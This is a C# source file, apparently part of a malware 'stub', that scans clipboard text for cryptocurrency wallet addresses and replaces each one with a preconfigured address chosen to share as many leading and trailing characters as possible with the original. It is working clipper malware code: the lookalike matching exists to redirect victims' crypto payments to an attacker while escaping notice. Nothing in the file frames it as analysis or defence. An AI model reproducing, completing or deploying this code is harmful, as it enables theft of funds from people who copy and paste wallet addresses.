using System;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Stub.Help
{
    class GetBestWallet
    {
        public static string Get(string clippboard)
        {
            string updatedBuf = clippboard;
            try
            {
                Parallel.ForEach(Config.addresses, regxvalue =>
                {
                    var pattern = regxvalue.Key;
                    var cryptocurrency = Config.addresses.FirstOrDefault(x => x.Key == pattern).Value;

                    // Игнорируем первые два символа для некоторых адресов у которых первый 2 символа всегда одинаковые.
                    var intIgnor = (cryptocurrency.Contains("bc1") || cryptocurrency.Contains("0x") || cryptocurrency.Contains("t1") || cryptocurrency.Contains("bnb") || cryptocurrency.Contains("UQ") || cryptocurrency.Contains("EQ")) ? 2 : 1;
                    var matches = pattern.Matches(updatedBuf);

                    foreach (Match match in matches)
                    {
                        var originalAddress = match.Value.Trim();

                        if (match.Success && cryptocurrency != null && !cryptocurrency.Contains(originalAddress) && !originalAddress.Contains("]"))
                        {
                            var bestMatch = cryptocurrency
                                .OrderByDescending(a => LastCharFitNum(a, originalAddress))
                                .ThenByDescending(a => FirstNum(a, originalAddress, intIgnor))
                                .First();

                            object lockObject = new object();
                            lock (lockObject)
                            {
                                updatedBuf = updatedBuf.Replace(originalAddress, bestMatch);
                            }
                        }
                        else
                            return;
                    }
                });

                return updatedBuf;
            }
            catch
            {
                return clippboard;
            }
        }

        private static int LastCharFitNum(string a, string b)
        {
            int cnt = 0;
            for (int i = 1; i <= Math.Min(a.Length, b.Length); i++)
            {
                if (a[a.Length - i] != b[b.Length - i])
                {
                    break;
                }
                cnt++;
            }
            return cnt;
        }

        private static int FirstNum(string a, string b, int intIgnor)
        {
            int cnt = 0;
            for (int i = intIgnor; i < Math.Min(a.Length, b.Length); i++)
            {
                if (a[i] != b[i])
                {
                    break;
                }
                cnt++;
            }
            return cnt;
        }
    }

}
